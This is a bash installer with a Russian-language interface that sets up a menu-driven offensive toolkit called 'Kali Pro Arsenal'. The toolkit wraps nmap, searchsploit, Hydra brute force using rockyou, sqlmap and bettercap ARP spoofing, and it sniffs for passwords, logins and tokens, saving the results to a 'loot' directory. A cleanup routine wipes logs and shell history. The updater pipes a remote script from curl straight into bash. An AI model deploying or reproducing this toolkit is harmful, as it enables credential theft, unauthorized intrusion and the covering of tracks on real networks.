#!/bin/bash

# VERSION 3.1 (Titanium Plus)
CURRENT_VERSION="3.1"

TARGET_FILE="/usr/local/bin/kali_pro"
UPDATE_SCRIPT="/usr/local/bin/update_kali"
REPO_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/kalipro_setup.sh"

echo -e "\033[0;36m[*] Развертывание Kali Pro Arsenal v$CURRENT_VERSION...\033[0m"

create_files() {
    echo -e "\033[0;33m[*] Подготовка интеллектуальных модулей...\033[0m"

    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=3.1
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

run_smart_check() {
    python3 -c "
import shutil
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (500*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
get_status('/sdcard', 'ПАМЯТЬ ТЕЛЕФОНА')
"
}

show_menu() {
    clear
    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}      KALI SAMSUNG ARSENAL - MENU v3.1     ${NC}"
    echo -e "${CYAN}===========================================${NC}"
    run_smart_check
    echo -e "${CYAN}-------------------------------------------${NC}"
    echo -e "${BLUE}1.${NC} РЕМОНТ И ГЛУБОКАЯ ОЧИСТКА"
    echo -e "${BLUE}2.${NC} СЕТЕВОЙ СКАНЕР (Smart Nmap)"
    echo -e "${BLUE}3.${NC} ПОИСК ЭКСПЛОЙТОВ (Searchsploit)"
    echo -e "${BLUE}4.${NC} ВЗЛОМ ПАРОЛЕЙ (Hydra)"
    echo -e "${BLUE}5.${NC} ВЕБ-АНАЛИЗ (SQLmap Loot)"
    echo -e "${BLUE}6.${NC} ПЕРЕХВАТ (Bettercap Smart)"
    echo -e "${BLUE}7.${NC} SMART INSTALLER (Эвристическая установка)"
    echo -e "${RED}0.${NC} ВЫХОД"
    echo -e "${CYAN}===========================================${NC}"
}

# --- ЭВРИСТИЧЕСКАЯ УСТАНОВКА (v3.1) ---
smart_installer() {
    read -p "Введите название пакета: " pkg
    [[ -z "$pkg" ]] && return
    echo -e "${CYAN}[*] Попытка эвристической установки: $pkg...${NC}"
    
    dpkg --configure -a
    if apt-get install -y "$pkg"; then
        echo -e "${GREEN}[+] Готово.${NC}"
    else
        echo -e "${YELLOW}[!] Сбой. Запуск цикла восстановления...${NC}"
        apt-get update --fix-missing
        apt-get install -f -y
        if apt-get install -y "$pkg"; then
            echo -e "${GREEN}[+] Установлено после ремонта.${NC}"
        else
            echo -e "${RED}[-] Ошибка. Проверьте сеть или имя пакета.${NC}"
        fi
    fi
    read -p "Enter..."
}

clean_system() {
    echo -e "${CYAN}=== ГЛУБОКОЕ ОБСЛУЖИВАНИЕ ===${NC}"
    dpkg --configure -a
    apt-get install -f -y
    apt-get update && apt-get full-upgrade -y
    apt-get autoremove --purge -y
    apt-get autoclean -y
    apt-get clean
    rm -rf /tmp/* /var/tmp/*
    find $HOME -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null
    find $HOME -name "*.log" -type f -delete 2>/dev/null
    history -c
    echo -ne "${BLUE}[!] Трофеи: ${NC}"; du -sh "$LOOT_DIR" | cut -f1
    read -p "Очистить трофеи? (y/n): " c_loot
    [[ "$c_loot" == "y" ]] && rm -rf "$LOOT_DIR"/* && echo -e "${RED}[-] Стерильно.${NC}"
    echo -e "${GREEN}[+] Система исправна!${NC}"
    sleep 2
}

smart_nmap() {
    read -p "Цель: " t; [[ -z "$t" ]] && return
    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
    read -p "Enter..."
}

smart_searchsploit() {
    read -p "Поиск: " q; searchsploit "$q"
    read -p "ID: " id
    [[ -n "$id" ]] && { cd "$LOOT_DIR"; searchsploit -m "$id"; }
    read -p "Enter..."
}

smart_brute() {
    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
    hydra -l $u -P /usr/share/wordlists/rockyou.txt $t $p -V | tee -a "$LOOT_DIR/brute_loot.txt"
}

smart_web_scan() {
    read -p "URL: " u; [[ -z "$u" ]] && return
    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
    grep -aE "Payload:|target URL" "$LOOT_DIR/sqlmap/log" 2>/dev/null || echo "Нет уязвимостей."
    read -p "Enter..."
}

smart_bettercap() {
    LFILE="$LOOT_DIR/bettercap_loot.txt"
    echo -e "1. Сниффер\n2. ARP-Spoof\n3. Трофеи"
    read -p "Опция: " o
    case $o in
        1) bettercap -eval "net.probe on; set net.sniff.verbose false; set net.sniff.regexp .*password|.*login|.*user|.*token; net.sniff on" ;;
        2) read -p "Target IP: " bt; echo 1 > /proc/sys/net/ipv4/ip_forward; bettercap -eval "set net.sniff.output $LFILE; set arp.spoof.targets $bt; arp.spoof on; net.sniff on" ;;
        3) [[ -f "$LFILE" ]] && grep -aE "password|login|user|token" "$LFILE" || echo "Пусто"; read -p "Enter..." ;;
    esac
}

START_TIME=$(date +"%H:%M:%S")
while true; do
    show_menu
    read -p "[Start: $START_TIME] Опция: " opt
    case $opt in
        1) clean_system ;;
        2) smart_nmap ;;
        3) smart_searchsploit ;;
        4) smart_brute ;;
        5) smart_web_scan ;;
        6) smart_bettercap ;;
        7) smart_installer ;;
        0) exit 0 ;;
        *) sleep 1 ;;
    esac
done
EOF

    cat << EOF > "$UPDATE_SCRIPT"
#!/bin/bash
echo -e "\033[0;34m[*] Обновление до v$CURRENT_VERSION...\033[0m"
curl -L "$REPO_URL" | bash
EOF

    chmod +x "$TARGET_FILE" "$UPDATE_SCRIPT"
    echo -e "\033[0;32m[+] v$CURRENT_VERSION Titanium Plus готова!${NC}"
}

if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] v$INSTALLED_VERSION актуальна.\033[0m"
    fi
fi
